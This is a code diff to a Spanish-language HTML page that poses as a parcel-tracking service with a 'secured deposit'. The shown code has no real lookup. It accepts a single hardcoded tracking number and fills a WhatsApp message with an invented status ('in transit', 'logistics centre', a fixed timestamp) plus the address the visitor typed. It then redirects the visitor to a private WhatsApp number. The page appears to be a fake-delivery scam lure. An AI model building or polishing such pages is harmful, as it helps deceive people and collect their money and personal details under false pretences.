@@ -14,7 +14,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-          color: white;
+            color: white;
         }
 
         .container {
@@ -30,11 +30,25 @@
             border: 1px solid rgba(255,255,255,0.1);
         }
 
-        .header-image {
-            width: 100%;
-            border-radius: 25px;
-            margin-bottom: 10px;
-            display: block;
+        /* Diseño solicitado: Servicio de entrega y Consulta guía */
+        .header-text {
+            margin-bottom: 20px;
+        }
+
+        .delivery-title {
+            font-size: 1.2rem;
+            margin: 0;
+        }
+
+        .consult-title {
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin: 5px 0;
+        }
+
+        .icons-lock {
+            font-size: 2rem;
+            margin: 10px 0;
         }
 
         h1 {
@@ -102,7 +116,11 @@
 <body>
 
 <div class="container">
-    <img src="https://photos.app.goo.gl/SNbNe1a927AW7EvS9" alt="Servicio de Entrega" class="header-image">
+    <div class="header-text">
+        <div class="delivery-title">(🚛Servicio de entrega✈️)</div>
+        <div class="consult-title">(Consulta guía)</div>
+        <div class="icons-lock">📦🔐📦</div>
+    </div>
 
     <h1>Consultar guía</h1>
     <p>Consulta el estado de tu envío con depósito asegurado</p>
@@ -112,7 +130,7 @@
         <input type="text" id="destino" placeholder="Ingresa la dirección de destino">
     </div>
 
-    <button class="btn btn-primary" onclick="validarGuia()">Consultar Guía</button>
+    <button class="btn btn-primary" onclick="validarYEnviar()">Consultar Guía</button>
     
     <button class="btn btn-secondary" onclick="irAlChatBot()">Chat Bot</button>
     
@@ -126,14 +144,26 @@
 </div>
 
 <script>
-    function validarGuia() {
+    function validarYEnviar() {
         const guiaInput = document.getElementById('numGuia').value.trim();
+        const destinoInput = document.getElementById('destino').value.trim() || "No especificada";
+        
         const codigoValido = "0750925931";
         const telefonoWhatsApp = "573026219839";
 
         if (guiaInput === codigoValido) {
-            const mensaje = encodeURIComponent("Hola, mi número de guía es " + codigoValido + ". Deseo consultar mi envío.");
-            window.location.href = "https://wa.me/" + telefonoWhatsApp + "?text=" + mensaje;
+            // Formateo del mensaje solicitado
+            const mensajeTexto = 
+                "Hola, solicito más información del envío:\n\n" +
+                "📦 Guía: " + codigoValido + "\n" +
+                "📍 Estado: En tránsito\n" +
+                "🏢 Ubicación: Centro logístico\n" +
+                "🎯 Dirección de destino: " + destinoInput + "\n" +
+                "🕒 Última actualización: 2/5/2026, 6:50:31 a. m.\n\n" +
+                "Quedo atento a la información.";
+
+            const mensajeURL = encodeURIComponent(mensajeTexto);
+            window.location.href = "https://wa.me/" + telefonoWhatsApp + "?text=" + mensajeURL;
         } else if (guiaInput === "") {
             alert("Por favor, ingresa el número de guía.");
         } else {
